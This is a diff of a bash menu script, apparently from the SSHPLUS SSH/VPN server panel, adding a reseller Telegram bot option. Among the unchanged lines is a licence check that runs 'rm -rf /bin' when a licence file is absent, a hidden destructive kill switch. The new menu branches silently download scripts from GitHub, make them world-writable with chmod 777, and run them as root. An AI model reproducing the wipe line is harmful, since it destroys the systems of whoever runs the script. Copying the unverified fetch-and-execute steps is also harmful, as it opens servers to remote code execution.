@@ -273,6 +273,7 @@ on="\033[1;32m◉ " && off="\033[1;31m○ "
 [[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
 stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 stsbotteste=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+stsbotrev=$(ps x | grep "bot_rev" | grep -v grep >/dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
@@ -318,7 +319,8 @@ echo -e "[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;33mSPEEDTEST \033[1;31m
 [\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mREMOVER HOST \033[1;31m
 [\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mFIREWALL $stsf\033[1;31m
 [\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot \033[1;31m
-[\033[1;36mTE\033[1;31m] \033[1;37m• \033[1;33mBOT TESTE $stsbotteste \033[1;31m
+[\033[1;36mbt\033[1;31m] \033[1;37m• \033[1;33mBOT TESTE $stsbotteste \033[1;31m
+[\033[1;36mbr\033[1;31m] \033[1;37m• \033[1;33mBOT REVENDA $stsbotrev\033[1;31m
 [\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mBADVPN PRO $stsu\033[1;31m
 [\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mTCPSPEED $tcp\033[1;31m
 [\033[1;36m09\033[1;31m] \033[1;37m• \033[1;33mONLINE APP $stson \033[1;31m
@@ -362,15 +364,24 @@ case "$x" in
    6 | 06)
    botssh
    ;;
-   te | TE)
+   bt | BT)
+   clear
    [[ ! -e /root/BOT ]] && mkdir /root/BOT > /dev/null 2>&1
    rm -rf /root/BOT/ShellBot.sh > /dev/null 2>&1
-   rm -rf /bin/botteste.sh > /dev/null 2>&1
    wget -O /root/BOT/ShellBot.sh https://raw.githubusercontent.com/leitura/SSHPLUS/master/Sistema/ShellBot.sh > /dev/null 2>&1
-   wget -O /bin/botteste.sh https://raw.githubusercontent.com/leitura/ospacotesmb/main/botteste.sh > /dev/null 2>&1
    chmod 777 /root/BOT/ShellBot.sh
+   rm -rf /bin/botteste.sh > /dev/null 2>&1
+   wget -O /bin/botteste.sh https://raw.githubusercontent.com/leitura/ospacotesmb/main/botteste.sh > /dev/null 2>&1
    chmod 777 /bin/botteste.sh
    botteste.sh
+   ;;
+   br | BR)
+   clear
+   [[ ! -e /root/BOT ]] && mkdir /root/BOT > /dev/null 2>&1
+   rm -rf /root/BOT/ShellBot.sh > /dev/null 2>&1
+   wget -O /root/BOT/ShellBot.sh https://raw.githubusercontent.com/leitura/SSHPLUS/master/Sistema/ShellBot.sh > /dev/null 2>&1
+   chmod 777 /root/BOT/ShellBot.sh
+   initbot
    ;;
    7 | 07)
    clear
